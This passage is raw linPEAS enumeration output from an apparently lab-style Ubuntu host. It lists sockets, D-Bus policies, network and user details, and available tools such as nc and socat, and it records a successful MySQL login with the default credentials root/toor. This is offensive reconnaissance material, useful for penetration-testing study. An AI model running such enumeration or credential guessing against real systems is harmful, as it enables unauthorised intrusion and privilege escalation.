is calling this writable listener: /var/run/dbus/system_bus_socket\r/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket\r/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log /lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout /lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket /lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog\r/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log\r/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout\r/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket\r/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request\r/snap/core18/1066/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket\r/snap/core18/1066/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket /snap/core18/1066/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log /snap/core18/1066/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout /snap/core18/1066/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket /snap/core18/1066/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog\r/snap/core18/1066/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log /snap/core18/1066/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout /snap/core18/1066/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket /snap/core18/1223/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket\r/snap/core18/1223/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket /snap/core18/1223/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log /snap/core18/1223/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout /snap/core18/1223/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket /snap/core18/1223/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog\r/snap/core18/1223/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log /snap/core18/1223/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout /snap/core18/1223/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket ╔══════════╣ Unix Sockets Listening\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets /run/acpid.socket └─(Read Write)\r/run/avahi-daemon/socket\r└─(Read Write)\r/run/cups/cups.sock\r└─(Read Write)\r/run/dbus/system_bus_socket\r└─(Read Write)\r/run/mysqld/mysqld.sock\r└─(Read Write)\r/run/NetworkManager/private-dhcp\r└─(Read )\r/run/systemd/fsck.progress\r/run/systemd/journal/dev-log\r└─(Read Write)\r/run/systemd/journal/socket\r└─(Read Write)\r/run/systemd/journal/stdout\r└─(Read Write)\r/run/systemd/journal/syslog\r└─(Read Write)\r/run/systemd/notify\r└─(Read Write)\r/run/systemd/private\r└─(Read Write)\r/run/udev/control\r/run/user/1000/bus\r└─(Read Write)\r/run/user/1000/gnupg/S.dirmngr\r└─(Read Write)\r/run/user/1000/gnupg/S.gpg-agent\r└─(Read Write)\r/run/user/1000/gnupg/S.gpg-agent.browser\r└─(Read Write)\r/run/user/1000/gnupg/S.gpg-agent.extra\r└─(Read Write)\r/run/user/1000/gnupg/S.gpg-agent.ssh\r└─(Read Write)\r/run/user/1000/systemd/notify\r└─(Read Write)\r/run/user/1000/systemd/private\r└─(Read Write)\r/run/user/121/bus\r/run/user/121/gnupg/S.dirmngr\r/run/user/121/gnupg/S.gpg-agent\r/run/user/121/gnupg/S.gpg-agent.browser\r/run/user/121/gnupg/S.gpg-agent.extra\r/run/user/121/gnupg/S.gpg-agent.ssh\r/run/user/121/pulse/native\r/run/user/121/systemd/private\r/run/uuidd/request\r└─(Read Write)\r/run/vmware/guestServicePipe\r└─(Read Write)\r/tmp/dbus-BaXlVSLh\r/tmp/dbus-FdNK7c2v\r/tmp/dbus-G0XXsiEA\r/tmp/dbus-khWxFP9g\r/tmp/dbus-mWjGXxtu\r/tmp/dbus-rIOGPzgn08\r/tmp/.ICE-unix/1554\r└─(Read Write)\r/tmp/.X11-unix/X0\r└─(Read Write)\r/var/run/dbus/system_bus_socket\r└─(Read Write)\r/var/run/mysqld/mysqld.sock\r└─(Read Write)\r/var/run/vmware/guestServicePipe\r└─(Read Write)\r╔══════════╣ D-Bus config files\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus Possible weak user policy found on /etc/dbus-1/system.d/avahi-dbus.conf ( \u0026lt;policy user=\u0026#34;avahi\u0026#34;\u0026gt;) Possible weak user policy found on /etc/dbus-1/system.d/avahi-dbus.conf ( \u0026lt;policy group=\u0026#34;netdev\u0026#34;\u0026gt;)\rPossible weak user policy found on /etc/dbus-1/system.d/bluetooth.conf ( \u0026lt;policy group=\u0026#34;bluetooth\u0026#34;\u0026gt;\r\u0026lt;policy group=\u0026#34;lp\u0026#34;\u0026gt;)\rPossible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf ( \u0026lt;policy user=\u0026#34;dnsmasq\u0026#34;\u0026gt;)\rPossible weak user policy found on /etc/dbus-1/system.d/gdm.conf ( \u0026lt;policy user=\u0026#34;gdm\u0026#34;\u0026gt;)\rPossible weak user policy found on /etc/dbus-1/system.d/kerneloops.conf ( \u0026lt;policy user=\u0026#34;kernoops\u0026#34;\u0026gt;)\rPossible weak user policy found on /etc/dbus-1/system.d/net.hadess.SensorProxy.conf ( \u0026lt;policy user=\u0026#34;geoclue\u0026#34;\u0026gt;)\rPossible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.ColorManager.conf ( \u0026lt;policy user=\u0026#34;colord\u0026#34;\u0026gt;)\rPossible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.GeoClue2.Agent.conf ( \u0026lt;policy user=\u0026#34;geoclue\u0026#34;\u0026gt;)\rPossible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.GeoClue2.conf ( \u0026lt;policy user=\u0026#34;geoclue\u0026#34;\u0026gt;)\rPossible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.NetworkManager.conf ( \u0026lt;policy user=\u0026#34;whoopsie\u0026#34;\u0026gt;) Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.RealtimeKit1.conf ( \u0026lt;policy user=\u0026#34;rtkit\u0026#34;\u0026gt;)\rPossible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf ( \u0026lt;policy group=\u0026#34;power\u0026#34;\u0026gt;)\rPossible weak user policy found on /etc/dbus-1/system.d/org.opensuse.CupsPkHelper.Mechanism.conf ( \u0026lt;policy user=\u0026#34;cups-pk-helper\u0026#34;\u0026gt;) Possible weak user policy found on /etc/dbus-1/system.d/pulseaudio-system.conf ( \u0026lt;policy user=\u0026#34;pulse\u0026#34;\u0026gt;)\rPossible weak user policy found on /etc/dbus-1/system.d/wpa_supplicant.conf ( \u0026lt;policy group=\u0026#34;netdev\u0026#34;\u0026gt;)\r╔══════════╣ D-Bus Service Objects list\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus NAME PID PROCESS USER CONNECTION UNIT SESSION DESCRIPTION :1.0 434 systemd-logind root :1.0 systemd-logind.service - - :1.1 424 systemd-resolve systemd-resolve :1.1 systemd-resolved.service - - :1.18 553 networkd-dispat root :1.18 networkd-dispatcher.se…ce - - :1.19 672 unattended-upgr root :1.19 unattended-upgrades.se…ce - - :1.2 1 systemd root :1.2 init.scope - - :1.20 1516 gdm3 root :1.20 gdm.service - - :1.21 1522 gdm-session-wor root :1.21 session-c1.scope c1 - :1.23 1545 Xorg gdm :1.23 session-c1.scope c1 - :1.24 1531 systemd gdm :1.24 user@121.service - - :1.26 1554 gnome-session-b gdm :1.26 session-c1.scope c1 - :1.28 1584 gnome-shell gdm :1.28 session-c1.scope c1 - :1.29 1591 upowerd root :1.29 upower.service - - :1.3 571 accounts-daemon[0m root :1.3 accounts-daemon.service - - :1.31 1607 rtkit-daemon root :1.31 rtkit-daemon.service - - :1.46 1645 boltd root :1.46 bolt.service - - :1.47 1650 packagekitd root :1.47 packagekit.service - - :1.48 1670 gsd-media-keys gdm :1.48 session-c1.scope c1 - :1.49 1664 gsd-color gdm :1.49 session-c1.scope c1 - :1.5 552 udisksd root :1.5 udisks2.service - - :1.50 1677 gsd-power gdm :1.50 session-c1.scope c1 - :1.51 1669 gsd-keyboard gdm :1.51 session-c1.scope c1 - :1.52 1721 colord colord :1.52 colord.service - - :1.57 1771 kerneloops kernoops :1.57 kerneloops.service - - :1.58 1773 kerneloops kernoops :1.58 kerneloops.service - - :1.59 1760 whoopsie whoopsie :1.59 whoopsie.service - - :1.6 564 avahi-daemon avahi :1.6 avahi-daemon.service - - :1.61 1760 whoopsie whoopsie :1.61 whoopsie.service - - :1.7 556 wpa_supplicant root :1.7 wpa_supplicant.service - - :1.71 2179 NetworkManager root :1.71 NetworkManager.service - - :1.72 2428 cupsd root :1.72 cups.service - - :1.73 2429 cups-browsed root :1.73 cups-browsed.service - - :1.74 2429 cups-browsed root :1.74 cups-browsed.service - - :1.8 631 polkitd root :1.8 polkit.service - - :1.82 13084 busctl love :1.82 session-6.scope 6 - :1.9 558 ModemManager root :1.9 ModemManager.service - - com.hp.hplip - - - (activatable) - - com.ubuntu.LanguageSelector - - - (activatable) - - com.ubuntu.SoftwareProperties - - - (activatable) - - com.ubuntu.SystemService - - - (activatable) - - com.ubuntu.WhoopsiePreferences - - - (activatable) - - fi.epitest.hostap.WPASupplicant 556 wpa_supplicant root :1.7 wpa_supplicant.service - - fi.w1.wpa_supplicant1 556 wpa_supplicant root :1.7 wpa_supplicant.service - - io.netplan.Netplan - - - (activatable) - - org.bluez - - - (activatable) - - org.debian.apt - - - (activatable) - - org.freedesktop.Accounts 571 accounts-daemon[0m root :1.3 accounts-daemon.service - - org.freedesktop.Avahi 564 avahi-daemon avahi :1.6 avahi-daemon.service - - org.freedesktop.ColorManager 1721 colord colord :1.52 colord.service - - org.freedesktop.DBus 1 systemd root - init.scope - - org.freedesktop.GeoClue2 - - - (activatable) - - org.freedesktop.ModemManager1 558 ModemManager root :1.9 ModemManager.service - - org.freedesktop.NetworkManager 2179 NetworkManager root :1.71 NetworkManager.service - - org.freedesktop.PackageKit 1650 packagekitd root :1.47 packagekit.service - - org.freedesktop.PolicyKit1 631 polkitd root :1.8 polkit.service - - org.freedesktop.RealtimeKit1 1607 rtkit-daemon root :1.31 rtkit-daemon.service - - org.freedesktop.UDisks2 552 udisksd root :1.5 udisks2.service - - org.freedesktop.UPower 1591 upowerd root :1.29 upower.service - - org.freedesktop.bolt 1645 boltd root :1.46 bolt.service - - org.freedesktop.fwupd - - - (activatable) - - org.freedesktop.hostname1 - - - (activatable) - - org.freedesktop.locale1 - - - (activatable) - - org.freedesktop.login1 434 systemd-logind root :1.0 systemd-logind.service - - org.freedesktop.network1 - - - (activatable) - - org.freedesktop.nm_dispatcher - - - (activatable) - - org.freedesktop.resolve1 424 systemd-resolve systemd-resolve :1.1 systemd-resolved.service - - org.freedesktop.systemd1 1 systemd root :1.2 init.scope - - org.freedesktop.thermald - - - (activatable) - - org.freedesktop.timedate1 - - - (activatable) - - org.gnome.DisplayManager 1516 gdm3 root :1.20 gdm.service - - org.opensuse.CupsPkHelper.Mechanism - - - (activatable) - - ╔═════════════════════╗\r══════════════════════════════╣ Network Information ╠══════════════════════════════ ╚═════════════════════╝ ╔══════════╣ Hostname, hosts and DNS\relection 127.0.0.1 localhost\r127.0.1.1 love\r::1 ip6-localhost ip6-loopback\rfe00::0 ip6-localnet\rff00::0 ip6-mcastprefix\rff02::1 ip6-allnodes\rff02::2 ip6-allrouters\rnameserver 127.0.0.53\roptions edns0\r╔══════════╣ Interfaces\r# symbolic names for networks, see networks(5) for more information link-local 169.254.0.0\rens35: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500\rinet 192.168.213.211 netmask 255.255.255.0 broadcast 192.168.213.255\rinet6 fe80::250:56ff:feba:132 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt;\rether 00:50:56:ba:01:32 txqueuelen 1000 (Ethernet)\rRX packets 294293 bytes 39712745 (39.7 MB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 338015 bytes 93133227 (93.1 MB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\rlo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536\rinet 127.0.0.1 netmask 255.0.0.0\rinet6 ::1 prefixlen 128 scopeid 0x10\u0026lt;host\u0026gt;\rloop txqueuelen 1000 (Local Loopback)\rRX packets 786 bytes 79534 (79.5 KB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 786 bytes 79534 (79.5 KB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\r╔══════════╣ Active Ports\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:43958 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:631 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp6 0 0 :::22 :::* LISTEN - tcp6 0 0 ::1:43958 :::* LISTEN - tcp6 0 0 ::1:631 :::* LISTEN - tcp6 0 0 :::80 :::* LISTEN - ╔══════════╣ Can I sniff with tcpdump?\rNo ╔═══════════════════╗\r═══════════════════════════════╣ Users Information ╠═══════════════════════════════ ╚═══════════════════╝ ╔══════════╣ My user\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users uid=1000(love) gid=1000(love) groups=1000(love),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)\r╔══════════╣ Do I have PGP keys?\r/usr/bin/gpg netpgpkeys Not Found\rnetpgp Not Found ╔══════════╣ Checking \u0026#39;sudo -l\u0026#39;, /etc/sudoers, and /etc/sudoers.d\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid ╔══════════╣ Checking sudo tokens\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens ptrace protection is enabled (1) ╔══════════╣ Checking Pkexec policy\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2 [Configuration]\rAdminIdentities=unix-user:0\r[Configuration]\rAdminIdentities=unix-group:sudo;unix-group:admin\r╔══════════╣ Superusers\rroot:x:0:0:root:/root:/bin/bash ╔══════════╣ Users with console\rlove:x:1000:1000:love,,,:/home/love:/bin/bash root:x:0:0:root:/root:/bin/bash\r╔══════════╣ All users \u0026amp; groups\ruid=0(root) gid=0(root) groups=0(root) uid=1000(love) gid=1000(love) groups=1000(love),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)\ruid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)\ruid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)\ruid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)\ruid=103(messagebus) gid=107(messagebus) groups=107(messagebus)\ruid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)\ruid=105(uuidd) gid=111(uuidd) groups=111(uuidd)\ruid=106(avahi-autoipd) gid=112(avahi-autoipd) groups=112(avahi-autoipd)\ruid=107(usbmux) gid=46(plugdev) groups=46(plugdev)\ruid=108(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)\ruid=109(rtkit) gid=114(rtkit) groups=114(rtkit)\ruid=10(uucp) gid=10(uucp) groups=10(uucp)\ruid=110(cups-pk-helper) gid=116(lpadmin) groups=116(lpadmin)\ruid=111(speech-dispatcher) gid=29(audio) groups=29(audio)\ruid=112(whoopsie) gid=117(whoopsie) groups=117(whoopsie)\ruid=113(kernoops) gid=65534(nogroup) groups=65534(nogroup)\ruid=114(saned) gid=119(saned) groups=119(saned),118(scanner)\ruid=115(pulse) gid=120(pulse) groups=120(pulse),29(audio)\ruid=116(avahi) gid=122(avahi) groups=122(avahi)\ruid=117(colord) gid=123(colord) groups=123(colord)\ruid=118(hplip) gid=7(lp) groups=7(lp)\ruid=119(geoclue) gid=124(geoclue) groups=124(geoclue)\ruid=120(gnome-initial-setup) gid=65534(nogroup) groups=65534(nogroup)\ruid=121(gdm) gid=125(gdm) groups=125(gdm)\ruid=122(mysql) gid=127(mysql) groups=127(mysql)\ruid=123(sshd) gid=65534(nogroup) groups=65534(nogroup)\ruid=124(lightdm) gid=128(lightdm) groups=128(lightdm)\ruid=13(proxy) gid=13(proxy) groups=13(proxy)\ruid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)\ruid=2(bin) gid=2(bin) groups=2(bin)\ruid=33(www-data) gid=33(www-data) groups=33(www-data)\ruid=34(backup) gid=34(backup) groups=34(backup)\ruid=38(list) gid=38(list) groups=38(list)\ruid=39(irc) gid=39(irc) groups=39(irc)\ruid=3(sys) gid=3(sys) groups=3(sys)\ruid=41(gnats) gid=41(gnats) groups=41(gnats)\ruid=4(sync) gid=65534(nogroup) groups=65534(nogroup)\ruid=5(games) gid=60(games) groups=60(games)\ruid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)\ruid=6(man) gid=12(man) groups=12(man)\ruid=7(lp) gid=7(lp) groups=7(lp)\ruid=8(mail) gid=8(mail) groups=8(mail)\ruid=999(vboxadd) gid=1(daemon[0m) groups=1(daemon[0m)\ruid=9(news) gid=9(news) groups=9(news)\r╔══════════╣ Login now\r20:52:46 up 1:35, 1 user, load average: 1.61, 1.21, 1.07 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT\rlove pts/0 192.168.45.238 20:45 1:10 0.07s 0.00s w\r╔══════════╣ Last logons\rlove pts/0 Mon May 15 20:45:05 2023 still logged in 192.168.45.238 wtmp begins Mon May 15 20:45:05 2023\r╔══════════╣ Last time logon each user\rUsername Port From Latest root pts/1 127.0.0.1 Thu Jun 16 20:19:06 +0530 2022\rlove pts/0 192.168.45.238 Mon May 15 20:45:05 +0530 2023\r╔══════════╣ Do not forget to test \u0026#39;su\u0026#39; as any other user with shell: without password and with their names as password (I can\u0026#39;t do it...) ╔══════════╣ Do not forget to execute \u0026#39;sudo -l\u0026#39; without password or with valid password (if you know it)!!\r╔══════════════════════╗\r═════════════════════════════╣ Software Information ╠═════════════════════════════ ╚══════════════════════╝ ╔══════════╣ Useful software\r/usr/bin/base64 /usr/bin/curl\r/usr/bin/gcc\r/usr/bin/gdb\r/usr/bin/make\r/bin/nc\r/bin/netcat\r/usr/bin/perl\r/usr/bin/php\r/bin/ping\r/usr/bin/python\r/usr/bin/python2\r/usr/bin/python2.7\r/usr/bin/python3\r/usr/bin/python3.6\r/usr/bin/socat\r/usr/bin/sudo\r/usr/bin/wget\r╔══════════╣ Installed Compilers\rii g++-7 7.5.0-3ubuntu1~18.04 amd64 GNU C++ compiler\rii gcc 4:7.4.0-1ubuntu2.3 amd64 GNU C compiler\rii gcc-7 7.5.0-3ubuntu1~18.04 amd64 GNU C compiler\r/usr/bin/gcc\r╔══════════╣ MySQL version\rmysql Ver 15.1 Distrib 10.1.44-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2 MySQL user: user\r═╣ MySQL connection using default root/root ........... No\r═╣ MySQL connection using root/toor ................... Yes User Host authentication_string\rroot localhost\rnewuser localhost\r═╣ MySQL connection using root/NOPASS ................. No\r╔══════════╣ Searching mysql credentials and exec\rFrom \u0026#39;/etc/mysql/mariadb.conf.d/50-server.cnf\u0026#39; Mysql user: user = mysql From \u0026#39;/etc/mysql/mysql.conf.d/mysqld.cnf\u0026#39; Mysql user: user = mysql\rFound readable /etc/mysql/my.cnf\r[client-server]\r!includedir /etc/mysql/conf.d/\r!includedir /etc/mysql/mariadb.conf.d/\r╔══════════╣ Analyzing MariaDB Files (limit 70)\r-rw-r--r-- 1 root root 869 Jan 30 2020 /etc/mysql/mariadb.cnf [client-server]\r!includedir /etc/mysql/conf.d/\r!includedir /etc/mysql/mariadb.conf.d/\r-rw------- 1 root root 277 Apr 2 2020 /etc/mysql/debian.cnf\r╔══════════╣ Analyzing Apache-Nginx Files (limit 70)\rApache version: Server version: Apache/2.4.29 (Ubuntu) Server built: 2020-03-13T12:26:16\rhttpd Not Found\rNginx version: nginx Not Found\r/etc/apache2/conf-available/phpmyadmin.conf- \u0026lt;IfModule mod_mime.c\u0026gt;\r/etc/apache2/conf-available/phpmyadmin.conf: AddType application/x-httpd-php .php\r--\r/etc/apache2/conf-available/phpmyadmin.conf- \u0026lt;FilesMatch \u0026#34;.+\\.php$\u0026#34;\u0026gt;\r/etc/apache2/conf-available/phpmyadmin.conf: SetHandler application/x-httpd-php\r--\r/etc/apache2/conf-available/phpmyadmin.conf- \u0026lt;IfModule mod_mime.c\u0026gt;\r/etc/apache2/conf-available/phpmyadmin.conf: AddType application/x-httpd-php .php\r--\r/etc/apache2/conf-available/phpmyadmin.conf- \u0026lt;FilesMatch \u0026#34;.+\\.php$\u0026#34;\u0026gt;\r/etc/apache2/conf-available/phpmyadmin.conf: SetHandler application/x-httpd-php\r--\r/etc/apache2/conf-enabled/phpmyadmin.conf- \u0026lt;IfModule mod_mime.c\u0026gt;\r/etc/apache2/conf-enabled/phpmyadmin.conf: AddType application/x-httpd-php .php\r--\r/etc/apache2/conf-enabled/phpmyadmin.conf- \u0026lt;FilesMatch \u0026#34;.+\\.php$\u0026#34;\u0026gt;\r/etc/apache2/conf-enabled/phpmyadmin.conf: SetHandler application/x-httpd-php\r--\r/etc/apache2/conf-enabled/phpmyadmin.conf- \u0026lt;IfModule mod_mime.c\u0026gt;\r/etc/apache2/conf-enabled/phpmyadmin.conf: AddType application/x-httpd-php .php\r--\r/etc/apache2/conf-enabled/phpmyadmin.conf- \u0026lt;FilesMatch \u0026#34;.+\\.php$\u0026#34;\u0026gt;\r/etc/apache2/conf-enabled/phpmyadmin.conf: SetHandler application/x-httpd-php\r--\r/etc/apache2/mods-enabled/php7.1.conf-\u0026lt;FilesMatch \u0026#34;.+\\.ph(ar|p|tml)$\u0026#34;\u0026gt;\r/etc/apache2/mods-enabled/php7.1.conf: SetHandler application/x-httpd-php\r--\r/etc/apache2/mods-enabled/php7.1.conf-\u0026lt;FilesMatch \u0026#34;.+\\.phps$\u0026#34;\u0026gt;\r/etc/apache2/mods-enabled/php7.1.conf: SetHandler application/x-httpd-php-source\r--\r/etc/apache2/mods-available/php7.1.conf-\u0026lt;FilesMatch \u0026#34;.+\\.ph(ar|p|tml)$\u0026#34;\u0026gt;\r/etc/apache2/mods-available/php7.1.conf: SetHandler application/x-httpd-php\r--\r/etc/apache2/mods-available/php7.1.conf-\u0026lt;FilesMatch \u0026#34;.+\\.phps$\u0026#34;\u0026gt;\r/etc/apache2/mods-available/php7.1.conf: SetHandler application/x-httpd-php-source\r══╣ PHP exec extensions\rdrwxr-xr-x 2 root root 4096 Oct 20 2019 /etc/apache2/sites-enabled drwxr-xr-x 2 root root 4096 Oct 20 2019 /etc/apache2/sites-enabled\rlrwxrwxrwx 1 root root 35 Oct 20 2019 /etc/apache2/sites-enabled/000-default.conf -\u0026gt; ../sites-available/000-default.conf \u0026lt;VirtualHost *:80\u0026gt;\rServerAdmin webmaster@localhost\rDocumentRoot /var/www/html\rErrorLog ${APACHE_LOG_DIR}/error.log\rCustomLog ${APACHE_LOG_DIR}/access.log combined\r\u0026lt;/VirtualHost\u0026gt;\r-rw-r--r-- 1 root root 1332 Jul 16 2019 /etc/apache2/sites-available/000-default.conf\r\u0026lt;VirtualHost *:80\u0026gt;\rServerAdmin webmaster@localhost\rDocumentRoot /var/www/html\rErrorLog ${APACHE_LOG_DIR}/error.log\rCustomLog ${APACHE_LOG_DIR}/access.log combined\r\u0026lt;/VirtualHost\u0026gt;\rlrwxrwxrwx 1 root root 35 Oct 20 2019 /etc/apache2/sites-enabled/000-default.conf -\u0026gt; ../sites-available/000-default.conf \u0026lt;VirtualHost *:80\u0026gt;\rServerAdmin webmaster@localhost\rDocumentRoot /var/www/html\rErrorLog ${APACHE_LOG_DIR}/error.log\rCustomLog ${APACHE_LOG_DIR}/access.log combined\r\u0026lt;/VirtualHost\u0026gt;\r-rw-r--r-- 1 root root 72426 Oct 20 2019 /etc/php/7.1/apache2/php.ini\rallow_url_fopen = On\rallow_url_include = On\rodbc.allow_persistent = On\ribase.allow_persistent = 1\rmysqli.allow_persistent = On\rpgsql.allow_persistent = On\r-rw-r--r-- 1 root root 72036 Sep 2 2019 /etc/php/7.1/cli/php.ini\rallow_url_fopen = On\rallow_url_include = Off\rodbc.allow_persistent = On\ribase.allow_persistent = 1\rmysqli.allow_persistent = On\rpgsql.allow_persistent = On\r╔══════════╣ Analyzing Rsync Files (limit 70)\r-rw-r--r-- 1 root root 1044 Feb 14 2020 /usr/share/doc/rsync/examples/rsyncd.conf [ftp]\rcomment = public archive\rpath = /var/www/pub\ruse chroot = yes\rlock file = /var/lock/rsyncd\rread only = yes\rlist = yes\ruid = nobody\rgid = nogroup\rstrict modes = yes\rignore errors = no\rignore nonreadable = yes\rtransfer logging = no\rtimeout = 600\rrefuse options = checksum dry-run\rdont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz\r╔══════════╣ Analyzing Wifi Connections Files (limit 70)\rdrwxr-xr-x 2 root root 4096 May 27 2020 /etc/NetworkManager/system-connections drwxr-xr-x 2 root root 4096 May 27 2020 /etc/NetworkManager/system-connections\r-rw------- 1 root root 347 May 27 2020 /etc/NetworkManager/system-connections/Wired connection 3\r-rw------- 1 root root 347 Apr 9 2020 /etc/NetworkManager/system-connections/Wired connection 2\r-rw------- 1 root root 348 Oct 21 2019 /etc/NetworkManager/system-connections/Wired connection 1\r╔══════════╣ Analyzing Ldap Files (limit 70)\rThe password hash is from the {SSHA} to \u0026#39;structural\u0026#39; drwxr-xr-x 2 root root 4096 May 27 2020 /etc/ldap\rdrwxr-xr-x 2 root root 32 Jul 9 2019 /snap/core18/1066/etc/ldap\rdrwxr-xr-x 2 root root 32 Oct 10 2019 /snap/core18/1223/etc/ldap\rdrwxr-xr-x 2 root root 32 Jul 10 2019 /snap/gnome-3-28-1804/67/etc/ldap\rdrwxr-xr-x 2 root root 32 Aug 13 2019 /snap/gnome-3-28-1804/71/etc/ldap\r╔══════════╣ Searching ssl/ssh files\r╔══════════╣ Analyzing SSH Files (limit 70) -rw-r--r-- 1 love love 222 Jun 16 2022 /home/love/.ssh/known_hosts\r|1|rViD8fxCqjFXPypHQLj/5zR0GwE=|fwQybekUmOylw6o00EPsfR0XCWI= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO9gF8Fv+Uox9ftsvK/DNkPNObtE4BiuaXjwksbOizwtXBepSbhUTyL5We/fWe7x62XW0CMFJWcuQsBNS7IyjsE=\rPermitRootLogin yes\rChallengeResponseAuthentication no\rUsePAM yes\r══╣ Possible private SSH keys were found!\r/etc/ImageMagick-6/mime.xml\r══╣ Some certificates were found (out limited):\r/etc/pki/fwupd/LVFS-CA.pem /etc/pki/fwupd-metadata/LVFS-CA.pem\r/etc/ssl/certs/ACCVRAIZ1.pem\r/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem\r/etc/ssl/certs/Actalis_Authentication_Root_CA.pem\r/etc/ssl/certs/AddTrust_External_Root.pem\r/etc/ssl/certs/AffirmTrust_Commercial.pem\r/etc/ssl/certs/AffirmTrust_Networking.pem\r/etc/ssl/certs/AffirmTrust_Premium_ECC.pem\r/etc/ssl/certs/AffirmTrust_Premium.pem\r/etc/ssl/certs/Amazon_Root_CA_1.pem\r/etc/ssl/certs/Amazon_Root_CA_2.pem\r/etc/ssl/certs/Amazon_Root_CA_3.pem\r/etc/ssl/certs/Amazon_Root_CA_4.pem\r/etc/ssl/certs/Atos_TrustedRoot_2011.pem\r/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem\r/etc/ssl/certs/Baltimore_CyberTrust_Root.pem\r/etc/ssl/certs/Buypass_Class_2_Root_CA.pem\r/etc/ssl/certs/Buypass_Class_3_Root_CA.pem\r/etc/ssl/certs/ca-certificates.crt\r4106PSTORAGE_CERTSBIN\r══╣ Some home ssh config file was found\r/usr/share/openssh/sshd_config ChallengeResponseAuthentication no\rUsePAM yes\rX11Forwarding yes\rPrintMotd no\rAcceptEnv LANG LC_*\rSubsystem sftp /usr/lib/openssh/sftp-server\r══╣ /etc/hosts.allow file found, trying to read the rules:\r/etc/hosts.allow Searching inside /etc/ssh/ssh_config for interesting info\rHost *\rSendEnv LANG LC_*\rHashKnownHosts yes\rGSSAPIAuthentication yes\r╔══════════╣ Analyzing PAM Auth Files (limit 70)\rdrwxr-xr-x 2 root root 4096 Jun 16 2022 /etc/pam.d -rw-r--r-- 1 root root 2133 Mar 4 2019 /etc/pam.d/sshd\raccount required 